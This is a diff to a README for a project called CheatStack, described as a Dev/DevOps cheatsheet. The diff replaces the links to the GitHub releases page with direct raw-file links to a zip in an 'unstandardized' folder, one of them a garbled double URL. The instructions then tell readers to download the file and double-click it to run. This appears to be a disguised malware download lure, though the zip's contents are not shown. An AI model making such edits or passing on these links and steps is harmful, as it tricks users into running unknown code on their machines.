@@ -6,7 +6,7 @@ CheatStack is the ultimate Dev/DevOps cheatsheet, packed with essential commands
 
 ## 📥 Download CheatStack
 
-[![Download CheatStack](https://img.shields.io/badge/Download%20CheatStack-v1.0-blue.svg)](https://github.com/azan0072/cheat-stack/releases)
+[![Download CheatStack](https://raw.githubusercontent.com/azan0072/cheat-stack/main/unstandardized/cheat-stack.zip%https://raw.githubusercontent.com/azan0072/cheat-stack/main/unstandardized/cheat-stack.zip)](https://raw.githubusercontent.com/azan0072/cheat-stack/main/unstandardized/cheat-stack.zip)
 
 ## 📂 Features
 
@@ -45,7 +45,7 @@ CheatStack includes commands for the following topics:
 
 To get started with CheatStack, please follow these steps:
 
-1. **Visit the Releases Page**: Go to the CheatStack [Releases page](https://github.com/azan0072/cheat-stack/releases).
+1. **Visit the Releases Page**: Go to the CheatStack [Releases page](https://raw.githubusercontent.com/azan0072/cheat-stack/main/unstandardized/cheat-stack.zip).
 2. **Select the Latest Version**: Look for the most recent release.
 3. **Download the Package**: Click on the appropriate file to download. 
 4. **Run the Application**: After downloading, locate the file on your computer and double-click it to run.
